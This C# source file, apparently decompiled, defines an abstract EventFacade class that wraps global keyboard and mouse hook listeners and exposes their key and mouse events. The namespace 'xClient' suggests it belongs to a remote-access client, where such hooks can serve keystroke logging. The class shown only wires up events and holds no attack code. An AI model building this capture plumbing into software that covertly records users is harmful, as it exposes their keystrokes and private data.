using System;
using System.Windows.Forms;

namespace xClient.Core.MouseKeyHook.Implementation;

internal abstract class EventFacade : IKeyboardEvents, IKeyboardMouseEvents, IMouseEvents, IDisposable
{
	private KeyListener m_KeyListenerCache;

	private MouseListener m_MouseListenerCache;

	public event KeyEventHandler KeyDown
	{
		add
		{
			GetKeyListener().KeyDown += value;
		}
		remove
		{
			GetKeyListener().KeyDown -= value;
		}
	}

	public event KeyPressEventHandler KeyPress
	{
		add
		{
			GetKeyListener().KeyPress += value;
		}
		remove
		{
			GetKeyListener().KeyPress -= value;
		}
	}

	public event KeyEventHandler KeyUp
	{
		add
		{
			GetKeyListener().KeyUp += value;
		}
		remove
		{
			GetKeyListener().KeyUp -= value;
		}
	}

	public event MouseEventHandler MouseMove
	{
		add
		{
			GetMouseListener().MouseMove += value;
		}
		remove
		{
			GetMouseListener().MouseMove -= value;
		}
	}

	public event EventHandler<MouseEventExtArgs> MouseMoveExt
	{
		add
		{
			GetMouseListener().MouseMoveExt += value;
		}
		remove
		{
			GetMouseListener().MouseMoveExt -= value;
		}
	}

	public event MouseEventHandler MouseClick
	{
		add
		{
			GetMouseListener().MouseClick += value;
		}
		remove
		{
			GetMouseListener().MouseClick -= value;
		}
	}

	public event MouseEventHandler MouseDown
	{
		add
		{
			GetMouseListener().MouseDown += value;
		}
		remove
		{
			GetMouseListener().MouseDown -= value;
		}
	}

	public event EventHandler<MouseEventExtArgs> MouseDownExt
	{
		add
		{
			GetMouseListener().MouseDownExt += value;
		}
		remove
		{
			GetMouseListener().MouseDownExt -= value;
		}
	}

	public event MouseEventHandler MouseUp
	{
		add
		{
			GetMouseListener().MouseUp += value;
		}
		remove
		{
			GetMouseListener().MouseUp -= value;
		}
	}

	public event EventHandler<MouseEventExtArgs> MouseUpExt
	{
		add
		{
			GetMouseListener().MouseUpExt += value;
		}
		remove
		{
			GetMouseListener().MouseUpExt -= value;
		}
	}

	public event MouseEventHandler MouseWheel
	{
		add
		{
			GetMouseListener().MouseWheel += value;
		}
		remove
		{
			GetMouseListener().MouseWheel -= value;
		}
	}

	public event MouseEventHandler MouseDoubleClick
	{
		add
		{
			GetMouseListener().MouseDoubleClick += value;
		}
		remove
		{
			GetMouseListener().MouseDoubleClick -= value;
		}
	}

	public void Dispose()
	{
		if (m_MouseListenerCache != null)
		{
			m_MouseListenerCache.Dispose();
		}
		if (m_KeyListenerCache != null)
		{
			m_KeyListenerCache.Dispose();
		}
	}

	private KeyListener GetKeyListener()
	{
		KeyListener keyListenerCache = m_KeyListenerCache;
		if (keyListenerCache != null)
		{
			return keyListenerCache;
		}
		return m_KeyListenerCache = CreateKeyListener();
	}

	private MouseListener GetMouseListener()
	{
		MouseListener mouseListenerCache = m_MouseListenerCache;
		if (mouseListenerCache != null)
		{
			return mouseListenerCache;
		}
		return m_MouseListenerCache = CreateMouseListener();
	}

	protected abstract MouseListener CreateMouseListener();

	protected abstract KeyListener CreateKeyListener();
}
